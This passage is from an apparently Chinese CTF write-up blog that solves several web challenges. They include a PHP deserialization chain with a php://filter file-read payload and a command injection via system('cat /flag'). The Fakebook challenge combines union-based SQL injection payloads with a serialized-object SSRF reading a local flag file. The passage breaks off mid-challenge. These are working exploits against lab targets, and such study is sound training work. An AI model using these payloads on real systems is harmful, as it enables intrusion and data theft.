class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;f14g.php&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;i can&#x27;t get you want,But you can tell me before I wake up and change my mind&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is created,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;When the object is unserialized,I will be called&quot;</span>;</span><br><span class="line">        <span class="variable">$but</span> = <span class="string">&quot;I can CHANGE you&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt; want = <span class="variable">$but</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;C1ybaby!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;I&#x27;m the final function,when the object is destroyed,I will be called&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;So,let me see if you can get what you want\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;鲍勃,别傻愣着!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;人类最大的敌人,就是无序. Yahi param vaastavikta hai!&lt;BR&gt;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is serialized,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$About_me</span> = <span class="string">&quot;When the object is used as a string,I will be called&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ywant</span> = @<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;ywant&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$ywant</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析下链子，最终是要在<code>highlight_file($this-&gt;want)</code>下readflag，那么就要控制<code>$this-&gt;want</code>不能为<code>f14g.php</code>，也不能是个文件，然后，绕过<code>__wakeup()</code>，再往上走，就是需要给<code>$this-&gt;want</code>赋值，构造方法里传入的就是<code>$want</code>，在我们实例化对象时传，那么在最后一步的if判断里会触发<code>__toString</code>，就让<code>$this-&gt;want</code>为unserializeorder的对象，触发它的<code>__toString</code>，里面会<code>return $this-&gt;CORE</code>，这个也是可控的，可以考虑控制它为读取flag的语句，尝试下写exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span>,<span class="variable">$todonothing</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;1\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;鲍勃,别傻愣着!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">unserializeorder</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CORE</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;CORE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">body</span>(<span class="keyword">new</span> <span class="title function_ invoke__">unserializeorder</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>结果发现本地全部都能过但是靶机上就是不回显文件内容，后面再看并不需要用到unserializeorder类，直接控制want就可以了，我的理解是高亮显示文件的参数是<code>$this-&gt;want</code>，如果控制它为一个对象，就没用了，所以才不回显</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">body</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$want</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$todonothing</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"><span class="variable">$want</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$want</span> !== <span class="string">&quot; &quot;</span>) <span class="variable language_">$this</span>-&gt;want = <span class="variable">$want</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;want = <span class="variable language_">$this</span>-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$About_me</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;1\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;todonothing === <span class="variable language_">$this</span>-&gt;want)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;鲍勃,别傻愣着!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;I can CHANGE you&quot;</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You are not you....&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;want == <span class="string">&quot;f14g.php&quot;</span> OR <span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;want))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;You want my heart?No way!\n&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You got it!&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;want);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">body</span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>记得改body的成员数绕过wakeup</p>
<h1 id="166-SWPUCTF-2023-秋季新生赛-If-else"><a href="#166-SWPUCTF-2023-秋季新生赛-If-else" class="headerlink" title="166.[SWPUCTF 2023 秋季新生赛]If_else"></a>166.[SWPUCTF 2023 秋季新生赛]If_else</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">某一天,NSSCTF给了你一次机会,让你来自定义<span class="keyword">if</span>中的条件,提交后访问check.php查看结果</span><br><span class="line"></span><br><span class="line">提交方式<span class="variable">$_POST</span>[<span class="string">&quot;check&quot;</span>]</span><br><span class="line"></span><br><span class="line">记得访问一下check.php哦~</span><br><span class="line"></span><br><span class="line">check.php的内容</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(你提交的部分将会被写至这里)</span><br><span class="line">    &#123;<span class="variable">$a</span>=<span class="literal">true</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;<span class="variable">$b</span>=<span class="literal">true</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="literal">true</span>&amp;&amp;<span class="variable">$b</span>===<span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(cat /flag));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接传<code>check=system(&#39;cat /flag&#39;)</code>就行了，不用管ifelse</p>
<h1 id="167-网鼎杯-2018-Fakebook"><a href="#167-网鼎杯-2018-Fakebook" class="headerlink" title="167.[网鼎杯 2018]Fakebook"></a>167.[网鼎杯 2018]Fakebook</h1><p>robots.txt存在网页备份</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注册个账号，点账号名进view.php，参数no存在sql注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">-1 order by 5</span><br><span class="line">判断有4个字段</span><br><span class="line">payload2:</span><br><span class="line">-1 union/**/select 1,2,3,4</span><br><span class="line">2存在回显</span><br><span class="line">payload3:</span><br><span class="line">-1 union/**/select 1,database(),3,4</span><br><span class="line">fakebook</span><br><span class="line">payload4:</span><br><span class="line">-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27;</span><br><span class="line">users</span><br><span class="line">payload5:</span><br><span class="line">-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">no,username,passwd,data</span><br><span class="line">payload6:</span><br><span class="line">-1 union/**/select 1,group_concat(data),3,4 from fakebook.users</span><br><span class="line">序列化的字符串，意味着用户数据是以序列化形式存储的</span><br></pre></td></tr></table></figure>

<p>那么可以传入一个序列化对象去做些事情，审计一下备份的网页，这个类下的get存在ssrf，控制blog为<code>file:///var/www/html/flag.php</code>即可，exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="168-羊城杯-2020-Blackcat"><a href="#168-羊城杯-2020-Blackcat" class="headerlink" title="168.[羊城杯 2020]Blackcat"></a>168.[羊城杯 2020]Blackcat</h1><p>BUU做过，mp3尾巴有源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$clandestine</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span 